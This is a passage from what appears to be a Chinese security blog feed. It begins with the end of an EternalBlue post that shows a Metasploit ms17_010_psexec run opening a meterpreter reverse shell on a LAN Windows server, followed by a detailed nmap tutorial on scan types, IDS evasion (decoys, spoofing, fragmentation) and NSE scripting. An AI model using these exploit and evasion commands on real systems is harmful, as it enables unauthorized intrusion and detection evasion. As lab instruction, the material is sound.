255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:3c:07:87</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.1.187</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:bea</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><h2 id="ms17-010-psexec"><a href="#ms17-010-psexec" class="headerlink" title="ms17_010_psexec"></a>ms17_010_psexec</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> lhost 192.168.1.230</span><br><span class="line">lhost =&gt; 192.168.1.230</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; <span class="built_in">set</span> lport 7777</span><br><span class="line">lport =&gt; 7777</span><br><span class="line">msf exploit(windows/smb/ms17_010_psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:7777 </span><br><span class="line">[*] 192.168.1.187:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1</span><br><span class="line">[*] 192.168.1.187:445 - Built a write-what-where primitive...</span><br><span class="line">[+] 192.168.1.187:445 - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.230:7777 -&gt; 192.168.1.187:54873) at 2018-06-01 20:04:07 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:3c:07:87</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.1.187</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line">IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:bea</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line">IPv6 Address : fe80::64c3:4455:dfcc:57d1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure><p>本文章主要是操作步骤的，没有太多思路的分析，如果想仔细了解，可以看看以下的参考文章  </p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>永恒之蓝的参考文章:<br><a href="http://www.freebuf.com/articles/system/133853.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/133853.html</a><br><a href="https://www.bennythink.com/shadowbroker.html" target="_blank" rel="noopener">https://www.bennythink.com/shadowbroker.html</a><br>永恒的浪漫的参考文章<br><a href="http://www.freebuf.com/articles/system/132879.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/132879.html</a><br>永恒的冠军的参考文章<br><a href="https://www.bennythink.com/eternalchampion.html" target="_blank" rel="noopener">https://www.bennythink.com/eternalchampion.html</a><br>ms17_010_psexec的简介<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>namp工具的细究</title>
      <link href="/posts/9cda70be.html"/>
      <url>/posts/9cda70be.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>nmap主机端口开发探测神器，一直在使用它来主机发现和端口开放探测，不知道其原理，这次就来仔细地了解一下它的真面目。</p><a id="more"></a><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><h2 id="基于arp协议"><a href="#基于arp协议" class="headerlink" title="基于arp协议"></a>基于arp协议</h2><p>arp协议位于TCP/IP的协议族的网络层，主要解决逻辑地址和物理地址的转换关系。<br>当目标主机与我们处于同一网段时，使用arp协议扫描速度快，结果也精准。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -PR 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>扫描结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> RP-LINK.lan (192.168.1.1)</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">53/tcp open  domain</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> LAPTOP-1I94N8QB.lan (192.168.1.128)</span><br><span class="line">Host is up (0.0095s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">5357/tcp open  wsdapi</span><br><span class="line">MAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.189</span><br><span class="line">Host is up (0.0069s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.1.189 are closed</span><br><span class="line">MAC Address: 78:36:CC:51:05:C9 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.211</span><br><span class="line">Host is up (0.0052s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.1.211 are closed</span><br><span class="line">MAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-HTFCR1N.lan (192.168.1.234)</span><br><span class="line">Host is up (0.017s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">902/tcp  open  iss-realsecure</span><br><span class="line">912/tcp  open  apex-mesh</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line">MAC Address: A0:D3:7A:6C:61:AA (Intel Corporate)</span><br><span class="line"></span><br><span class="line">dnet: Failed to open device lo0</span><br><span class="line">QUITTING!</span><br></pre></td></tr></table></figure></p><h2 id="基于ICMP协议"><a href="#基于ICMP协议" class="headerlink" title="基于ICMP协议"></a>基于ICMP协议</h2><p>ICMP协议位于TCP/IP协议族中的网络层，是在IP主机、路由器之间传递控制消息。 </p><table><thead><tr><th>ICMP的报文种类</th><th>类型的值</th><th>ICMP报文的类型</th></tr></thead><tbody><tr><td>差错报文</td><td>3</td><td>终点不可到达</td></tr><tr><td></td><td>4</td><td>源抑制</td></tr><tr><td></td><td>11</td><td>超时</td></tr><tr><td></td><td>12</td><td>参数失灵</td></tr><tr><td></td><td>5</td><td>重定向</td></tr><tr><td>查询报文</td><td>8或0</td><td>响应请求或应答</td></tr><tr><td></td><td>13或14</td><td>时间戳请求或应答</td></tr><tr><td></td><td>17或18</td><td>地址掩码请求或应答</td></tr><tr><td></td><td>10或9</td><td>路由器询问或通告</td></tr></tbody></table><p>1.ICMP响应请求和应答<br>用来测试发送和接收两端链路及目标主机TCP/IP协议是否正常。<br>-PE 和ping实质上一样<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PE 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>2.ICMP时间戳请求和应答<br>ICMP时间戳允许系统向另外一个系统查询当前时间。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PP 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>3.地址掩码请求和应答。<br>ICMP地址掩码请求用源主机发送，用于无盘系统在引导过程中获取自己的子网掩码。大多数主机在收到请求时都发送一个应答。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PM 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><h2 id="基于TCP-IP协议"><a href="#基于TCP-IP协议" class="headerlink" title="基于TCP/IP协议"></a>基于TCP/IP协议</h2><p>1.TCP位于传输层的协议,面向连接可口的、基于字节流的传输层控制协议。<br><img src="/posts/../../images/zhahun/4.jpg" alt=""><br>1）TCP SYN扫描<br>向目标主机发送一个SYN标志的数据包（内容为空，默认端口80）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PS[端口号(默认为80)] 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> RP-LINK.lan (192.168.1.1)</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">MAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> PLK-AL10-ec350dc5c6e55ec3.lan (192.168.1.105)</span><br><span class="line">Host is up (0.071s latency).</span><br><span class="line">MAC Address: F8:23:B2:8E:8A:D1 (Huawei Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.128</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">MAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.211</span><br><span class="line">Host is up (0.079s latency).</span><br><span class="line">MAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-B0PU34P.lan (192.168.1.214)</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">MAC Address: 44:6D:57:ED:08:3C (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> HUAWEI_MAIMANG_5.lan (192.168.1.241)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">MAC Address: 00:5A:13:AD:6E:D7 (Huawei Technologies)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> DESKTOP-RG8DNUJ.lan (192.168.1.225)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (7 hosts up) scanned <span class="keyword">in</span> 39.62 seconds</span><br></pre></td></tr></table></figure></p><p>2）<br>2.TCP ACK<br>向目标主机发送一个TCP/ACK数据包，存活的主机会返回一个RST数据包。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PA 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>2.UDP协议<br>udp协议非面向连接的，不可靠的简单的传输层协议。当一个dup端口收到一个udp数据包时，如果是关闭的，就会给源端口发回一个ICMP端口不可达数据包，如果是开放的，就会丢弃这个数据包，不返回任何信息。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -PU 192.168.1.0.24</span><br></pre></td></tr></table></figure></p><h2 id="基于SCTP协议6"><a href="#基于SCTP协议6" class="headerlink" title="基于SCTP协议6"></a>基于SCTP协议6</h2><p>SCTP是传输层上的协议,与TCP完成的任务是相同的。 但存在很大 不同 </p><table><thead><tr><th>tcp</th><th>sctp</th></tr></thead><tbody><tr><td>单地址连接</td><td>多地址连接</td></tr><tr><td>基于字节流</td><td>基于消息流</td></tr><tr><td>只能支持一个流</td><td>同时支持多个流</td></tr><tr><td>通过三次握手实现连接</td><td>通过四次握手实现连接</td></tr></tbody></table><p>支持stcp协议的主机并不多，不建议使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PY 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><h2 id="使用IP协议"><a href="#使用IP协议" class="headerlink" title="使用IP协议"></a>使用IP协议</h2><p>所有的tcp udp icmp IGMP数据都是以ip数据包格式传输。 数据包中协议域的长度为8位，标识哪个协议想ip发送数据，ICMP为1,IGMP为2，TCP为6，UDP为7。<br><img src="/posts/../../images/zhahun/5.png" alt=""><br>nmap默认使用ICMP(1) IGMP(2) IP-IN-IP(4)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PO 192.168.1.0/24</span><br><span class="line">```  </span><br><span class="line"><span class="comment">## nmap中dns协议  </span></span><br><span class="line">1.nmap默认只会对活跃的主机进行dns转换，强制所有主机无论是否活跃都做dns转换可用-R</span><br><span class="line">```bash</span><br><span class="line">nmap -R 45.32.7.5-24</span><br></pre></td></tr></table></figure></p><p>2.ip都转换为域名会耗费大量时间，无须转换用-你<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -n 45.32.7.5-24</span><br></pre></td></tr></table></figure></p><h2 id="主机发现技术分析"><a href="#主机发现技术分析" class="headerlink" title="主机发现技术分析"></a>主机发现技术分析</h2><p>–packet-trace可以通过它就可以观察nmap发出的数据包和收到的数据包。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -PS 192.168.1.0/24</span><br><span class="line">``` </span><br><span class="line">观察结果时，发现nmap没有发送syn数据包。原来nmap的设计思路时: 先 判断目标主机与nmap所在的主机是否在同一网段，如果相同的话，则直接使用ARP扫描模式。  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描  </span></span><br><span class="line"><span class="comment">## 端口的分类  </span></span><br><span class="line">公认端口(Well Known Ports)   </span><br><span class="line">即一般意义上的常用端口。从0到1024；这些端口通常紧密地绑定在一些特定的系统服务中。  </span><br><span class="line">注册端口(Registered Ports)</span><br><span class="line">指的是从1025到49151的端口。松散着绑定一些服务。这些端口大部分没有明确定义服务对象，而且程序可以通过自己的需要定义使用哪些端口，很多远程控制软件和木马程序都会使用它们。  </span><br><span class="line">动态或私有端口( Dynamic or Private Ports)  </span><br><span class="line">49152到65535。正常情况下服务不会被分配到这些端口上，但很多木马喜欢。 </span><br><span class="line"><span class="comment">## 端口状态的定义  </span></span><br><span class="line">open:表明该端口有应用程序接收TCP链接或者UDP报文。 </span><br><span class="line">closed:端口可访问，可以接受nmap探测报文并做出响应。相比较而言没有应用程序在端口监听。 </span><br><span class="line">filtered:设备过滤了数据包，设备可能是路由器、防火墙甚至专门的软件。  </span><br><span class="line">unfiltered： 目标端口是可以访问的，但是无法判断open还是closed.（ACK扫描时才会出现）   </span><br><span class="line">open|filtered:无法确定端口是开放的还是被过滤了，开放的端口不响应就是一个例子。  </span><br><span class="line">closed|filtered: 无法确定端口是关闭还是被过滤了。只有在使用idle扫描时才会发生这种情况。  </span><br><span class="line"><span class="comment">## 端口扫描方法 </span></span><br><span class="line"><span class="comment">### SYN扫描  </span></span><br><span class="line">nmap默认的扫描方式，扫描极快，一秒钟可以扫描上千个端口，也不会在主机上留下扫描痕迹。     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 目标主机应答| 端口状态</span><br><span class="line">---|---</span><br><span class="line">SYN/ACK|open</span><br><span class="line">RST|closed</span><br><span class="line">没有应答|过滤</span><br><span class="line">ICMP无法抵达错误（类型3，代码1，2，3，4，10，13）|filtered </span><br><span class="line">```bash</span><br><span class="line">nmap -sS 45.32.8.31</span><br><span class="line">``` </span><br><span class="line"><span class="comment">### Tcp Connect扫描  </span></span><br><span class="line">跟syn扫描类似，只是完成 了tcp的三次握手。  </span><br><span class="line">```bash</span><br><span class="line">nmap -sT 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h3><p>相当慢<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 45.32.8.31</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>目标主机应答</th><th>端口状态</th></tr></thead><tbody><tr><td>UDP应答</td><td>open</td></tr><tr><td>没有应答</td><td>open 或者filtered</td></tr><tr><td>ICMP端口无法抵达错误（类型3，代码3）</td><td>closed</td></tr><tr><td>ICMP无法抵达错误（类型3，代码1，2，9，10，13）</td><td>filtered  </td></tr></tbody></table><h3 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP FIN扫描</h3><p>向目标端口发送一个FIN数据包，按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sF 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="NULL-扫描"><a href="#NULL-扫描" class="headerlink" title="NULL 扫描"></a>NULL 扫描</h3><p>向目标端口发送一个不包含任何标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sN 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="Xmas-Tree-扫描"><a href="#Xmas-Tree-扫描" class="headerlink" title="Xmas Tree 扫描"></a>Xmas Tree 扫描</h3><p>向目标端口发送一个含有FIN URG PUSH标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sX 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">### idle扫描  </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">nmap -Pn -p- -sI 第三方主机 目标主机</span><br></pre></td></tr></table></figure></p><h2 id="扫描指定的端口"><a href="#扫描指定的端口" class="headerlink" title="扫描指定的端口"></a>扫描指定的端口</h2><p>1.扫描常见的100个端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -F 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2.指定一个端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.使用名字来制定扫描端口。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -p smtp,http 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>4.扫描常用端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --top-ports  45.32.8.31</span><br><span class="line">``` </span><br><span class="line"><span class="comment"># 远程操作系统和服务 </span></span><br><span class="line">```bash</span><br><span class="line">-O 对操作系统扫描 </span><br><span class="line">-A 操作系统探测和服务发现</span><br><span class="line">-sV 服务和版本检测</span><br><span class="line">--allports  不为版本探测时排除任何端口  </span><br><span class="line">--version-intensity&lt;intensity&gt; -sV 探测报文的轻度值，默认为7 范围0~9 </span><br><span class="line">--version-all 尝试每个探测  相当于version-intensity 9</span><br><span class="line">--version-trace 跟踪版本扫描活动。 是--packet-trace 所得到的子集</span><br></pre></td></tr></table></figure></p><h1 id="nmap的高级使用"><a href="#nmap的高级使用" class="headerlink" title="nmap的高级使用"></a>nmap的高级使用</h1><p>1.对nmap发送的探测数据包进行分段。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -f 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2.最大传输单元（MTU）是指一种通信协议的某层桑面所能通过的最大数据包大小（字节为单位），以太网的默认值为1500bytes.<br>这里的mtu的值必须8的倍数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -mtu 16 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.使用诱饵主机隐蔽扫描<br>作为诱饵主机必须处于工作状态，否则就变成洪水攻击。在进行版本检测或tcp连接扫描时，诱饵扫描无效。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -D RND:4 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">```bash</span><br><span class="line">nmap -D 192.168.1.214 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">4.源端口欺骗  </span><br><span class="line">网络安全控制中有一种访问控制列表技术，依靠ip地址和端口来对数据包进行限制。</span><br><span class="line">可以通过--<span class="built_in">source</span>-port或-g指定源端口,来突破检测机制。 </span><br><span class="line">```bash</span><br><span class="line">namp -g 53 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>5.发送报文时附加随机数据<br>默认情况下nmap发送的报文中只包含头部，内容部分是空的，因此tcp数据包的大小只有40字节，而ICMP ECHO 请求只有28个字节。这种内容为空的报文很容易被目标网络检测机制所发现。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --data-length 20 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">6.设置IP time-to-live域</span><br><span class="line">```bash</span><br><span class="line">nmap -ttl 25 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>7.MAC地址欺骗<br>使用字符串“0” 将简单选择一个完全随机的MAC地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn --spoof-mac 0 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>8.扫描结果保存<br>1）文件本件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -oN <span class="string">"d:\\test.txt"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2）xml文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -oX &quot;d:\\test.xml&quot; 45.32.8.31</span><br></pre></td></tr></table></figure><p>3)grep文件之中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -oG  <span class="string">"d:\\test.grep"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><h1 id="nse脚本"><a href="#nse脚本" class="headerlink" title="nse脚本"></a>nse脚本</h1><ol><li>分类   </li></ol><table><thead><tr><th>分类</th><th>描述</th></tr></thead><tbody><tr><td>auth</td><td>包含的都是负责处理鉴权证书(绕开鉴权)的脚本</td></tr><tr><td>broadcast</td><td>在局域网内探查更多服务开启状况，如CHCP DNS SQL Sever等服务的脚本</td></tr><tr><td>brute</td><td>针对常见的应用，如HTTP/FTP等使用暴力破解密码的脚本</td></tr><tr><td>default</td><td>这是使用-sC和-A参数扫描时默认的脚本，提供基本脚本扫描能力</td></tr><tr><td>discovery</td><td>对网络进行更多的信息收集，如SMB收集、SNMP查询等</td></tr><tr><td>dos</td><td>用来发起拒绝服务攻击的脚本</td></tr><tr><td>exploit</td><td>用来完成对目标系统安全漏洞渗透的脚本</td></tr><tr><td>external</td><td>针对第三方服务的脚本</td></tr><tr><td>fuzzer</td><td>进行模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</td></tr><tr><td>intrusive</td><td>可能会引起目标系统崩溃或者对目标网络造成极大负担的脚本。这类脚本很容易被对方的防火墙或者IDS发现</td></tr><tr><td>malware</td><td>用来检测恶意软件的脚本 </td></tr><tr><td>safe</td><td>在任何情况下都是安全无害的脚本</td></tr><tr><td>version</td><td>负责增强服务与版本扫描功能的脚本</td></tr><tr><td>vuln</td><td>负责检查目标机是否有常见的漏洞 </td></tr></tbody></table><p>2.脚本的使用<br>调用一个脚本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script smb-vuln-ms17-010.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>调用一个分类<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script discovery 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.脚本的应用<br>1)修改nmap默认的客户端,使用脚本判断服务器所支持的http方法。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script http-methods --script-args http.useragent=<span class="string">"Mozilla 42"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>4.nse脚本规则<br>1）Prerule()规则，这个规则的执行要早于nmap的扫描，因此这类脚本不会调用nmap扫描得到的任何结果。执行的顺序是先脚本，后nmap扫描<br>2）Hostrule()规则，这个规则实在nmap已经完成了主机的发现之后执行的，根据主机发现的结果来触发该类脚本。执行的顺序是先nmap发现，后脚本。<br>3）Portrule(）规则，执行了端口扫描或版本侦测时才会触发的脚本，这个规则的执行与端口的状态联系紧密。执行的顺序是先nmap端口扫描后脚本。<br>4）Postrule(）规则，但所有的扫描都结束以后才会执行的脚本。<br>3.一个不错nse脚本编译工具Halcyon<br>5.将写的脚本添加到nmap中：将写好的 <code>*.nes</code> 文件 放在nmap安装目录的scripts文件夹中，再nmap中运行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap --script-updatedb</span><br></pre></td></tr></table></figure></p><p>5.<a href="http://www.runoob.com/lua/lua-environment.html" target="_blank" rel="noopener">lua语言</a>   </p><h1 id="nse中的api"><a href="#nse中的api" class="headerlink" title="nse中的api"></a>nse中的api</h1><p>nmap中的api的核心功能就是向脚本提供关于主机和端口的信息。<br>nmap引擎会向脚本传递乳腺连个Lua table类型的参数：<br>host table<br>port table </p><h2 id="host-table"><a href="#host-table" class="headerlink" title="host table"></a>host table</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host.os          包含目标的操作系统类型   </span><br><span class="line">host.ip          包含了目标的ip的地址   </span><br><span class="line">host.nmae        包含了目标的反向dns主机名  </span><br><span class="line">host.targetname  包含了目标主机在命令行中的名字    </span><br><span class="line">host.directly_connected 目标计算机是否与我们同在一个子网 </span><br><span class="line">host.mac_addr 目标的mac地址，只有处于同于网段才有效 </span><br><span class="line">host.mac_addr_src    使用的计算机的mac地址 </span><br><span class="line">host.interface_mtu 网络中的MTU的值</span><br><span class="line">host.bin_ip  目标的ip地址 </span><br><span class="line">host.bin_ip_src </span><br><span class="line">host.times  目标的时序数据</span><br><span class="line">host.traceroute 只有在指定--traceroute</span><br></pre></td></tr></table></figure><h2 id="port-table"><a href="#port-table" class="headerlink" title="port table"></a>port table</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port.number 标识了目标端口的编号</span><br><span class="line">port.protocol 目标端口的类型udP或tcp </span><br><span class="line">port.service 保存了端口上运行的服务</span><br><span class="line">port.version 通过服务扫描发现的版本信息，需要-sV扫描  </span><br><span class="line">port.state 保存了端口上运行的状态</span><br></pre></td></tr></table></figure><h1 id="nse的库文件"><a href="#nse的库文件" class="headerlink" title="nse的库文件"></a>nse的库文件</h1><p>这些库文件实现了代码分离和重构，涵盖了几乎当前所有的流行的协议、常见的字符串处理操作，甚至包含了用来实现对用户名和密码进行破解的brute库文件。     </p><h2 id="常见的Nse库文件"><a href="#常见的Nse库文件" class="headerlink" title="常见的Nse库文件"></a>常见的Nse库文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shortport    收集常见的端口规则信息</span><br><span class="line">comm      与目标机进行通信，数据交换 </span><br><span class="line">http     完成所有对http的相关安全检测操作  </span><br><span class="line">stdNSE   包含了NSE开发中各种有用的功能，涉及与定时、 并发、输出和字符串处理相关 的函数。   </span><br><span class="line">openSSL 用来绑定OpenSSL的借口，主要用来进行加密。</span><br><span class="line">target 这个库的主要目的是管理新发现目标的扫描队列</span><br><span class="line">creds 用来保存脚本在执行时发现的登录凭证   </span><br><span class="line">vluns  提供关于主机的安全漏洞方面的消息</span><br></pre></td></tr></table></figure><h1 id="nse中的数据文件"><a href="#nse中的数据文件" class="headerlink" title="nse中的数据文件"></a>nse中的数据文件</h1><p>指定数据目录的所在位置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --datadir D:\office\nmap-7.60\nselib\data -sC -sV 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>nmap选择数据文件的顺序<br>优先级1：选项–datadir所指定的目录<br>2：环境变量所指定的位置<br>3：安装目录<br>4：在编译时定义的目录   